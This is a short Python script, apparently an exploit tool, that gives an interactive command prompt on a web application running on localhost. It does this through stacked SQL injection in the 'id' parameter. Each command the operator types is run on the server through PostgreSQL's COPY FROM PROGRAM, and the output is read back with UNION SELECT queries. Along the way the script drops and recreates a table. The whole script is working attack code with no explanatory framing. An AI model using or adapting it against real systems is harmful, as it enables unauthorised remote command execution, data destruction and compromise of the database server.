from requests import get

url = "http://localhost:8080/user?id="

while True:
    cmd = input("cmd> ")
    if cmd == "exit":
        break
    get(url + "1; DROP TABLE IF EXISTS cmd_tbl;")
    get(url + "1; CREATE TABLE cmd_tbl(output TEXT);")
    get(url + "1; COPY cmd_tbl FROM PROGRAM '" + cmd + "';")
    i = 0
    print("[+] Output: ")
    while True:
        r = get(url + "0 UNION SELECT null, output, null, null, null,null,null FROM cmd_tbl LIMIT 1 OFFSET " + str(i) + ";")
        output = r.text.split("<span>")[4].split("</span>")[0]
        if output == "null":
            break
        print(output)
        i += 1
    